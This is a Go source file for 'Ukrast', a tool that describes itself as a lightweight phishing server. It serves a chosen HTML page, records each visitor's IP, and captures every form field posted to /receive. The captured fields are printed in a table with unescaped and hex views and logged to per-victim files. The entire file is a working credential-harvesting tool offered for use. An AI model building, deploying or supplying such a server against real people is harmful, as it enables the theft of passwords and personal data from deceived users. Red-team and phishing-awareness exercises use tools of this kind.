package main

import (
	"fmt"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"

	"github.com/apcera/termtables"
	"github.com/fatih/color"
	"github.com/urfave/cli"
)

type Server struct {
	port string
	file string
}

func main() {
	app := CreateApp()
	app.Run(os.Args)
}

func CreateApp() *cli.App {
	app := cli.NewApp()
	app.Name = "Ukrast"
	app.Usage = "Lightweight phishing server"

	app.Flags = []cli.Flag{
		cli.IntFlag{
			Name:  "port, p",
			Value: 8080,
			Usage: "webserver port",
		},
		cli.StringFlag{
			Name:  "file, f",
			Value: "index.html",
			Usage: "html page use for /",
		},
	}

	app.Action = Launch

	return app
}

func Launch(c *cli.Context) {
	srv := Server{
		c.String("port"),
		c.String("file"),
	}
	srv.Start()
}

func (s *Server) Start() {
	color.Green("# Starting server on port: " + s.port + "\n\n")

	http.HandleFunc("/", s.index)
	http.HandleFunc("/receive", s.receive)
	http.ListenAndServe(":"+s.port, nil)
}

func (s *Server) index(w http.ResponseWriter, req *http.Request) {
	ip := s.GetIp(req)

	color.Cyan("# New client connected (" + ip + ")\n")
	s.Log("# New client connected ("+ip+")", ip)

	http.ServeFile(w, req, "www/"+s.file)
}

func (s *Server) receive(w http.ResponseWriter, req *http.Request) {
	ip := s.GetIp(req)
	req.ParseForm()

	table := s.CreateTable(req)
	table.AddTitle("CLIENT: " + ip)
	str := table.Render()

	fmt.Println("\n#########")
	fmt.Println(str)
	s.Log(str, ip)
}

func (s *Server) GetIp(req *http.Request) string {
	ip, port, _ := net.SplitHostPort(req.RemoteAddr)
	return net.ParseIP(ip).String() + ":" + port
}

func (s *Server) CreateTable(req *http.Request) *termtables.Table {
	options := []string{"Keys", "Value", "Unescape", "Hex"}

	table := termtables.CreateTable()

	for _, option := range options {
		table.AddHeaders(option)
	}

	for key, val := range req.Form {
		str := strings.Join(val, "")
		table.AddRow(key, val, unescape(str), hex(str))
	}

	return table
}

func (s *Server) Log(str, ip string) {
	f, err := os.OpenFile("logs/"+ip, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)

	if err != nil {
		color.Red("error opening file: %v", err)
		return
	}

	log.SetOutput(f)
	log.SetPrefix("#########\n")
	log.Println("\n" + str)

	defer f.Close()
}

func unescape(str string) string {
	str, _ = url.QueryUnescape(str)
	return str
}

func hex(str string) string {
	var output []string

	for i := 0; i < len(str); i++ {
		output = append(output, fmt.Sprintf("%x", str[i]))
	}

	str = strings.Join(output, "")
	str = "0x" + str

	return str
}
